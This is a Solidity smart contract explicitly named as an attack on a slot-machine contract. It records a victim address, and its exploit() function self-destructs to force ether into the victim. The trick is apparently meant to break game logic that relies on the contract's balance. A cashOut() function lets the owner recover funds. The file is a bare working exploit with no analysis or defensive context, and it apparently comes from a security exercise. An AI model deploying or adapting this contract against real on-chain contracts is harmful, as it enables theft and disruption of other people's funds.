pragma solidity 0.4.24;
contract slotmachineattack {
        address public owner;
        address public victim_addr;

        constructor (address addr) public {
            //Remember our wallet address
            owner=msg.sender;
            //Rememberthe victim contract
            victim_addr = addr;
        }

        
        function exploit() external payable
        {
            selfdestruct(victim_addr);
        }
        
        function cashOut() external 
        {
            selfdestruct(owner);
        }
        
        function () public payable {
        }
}
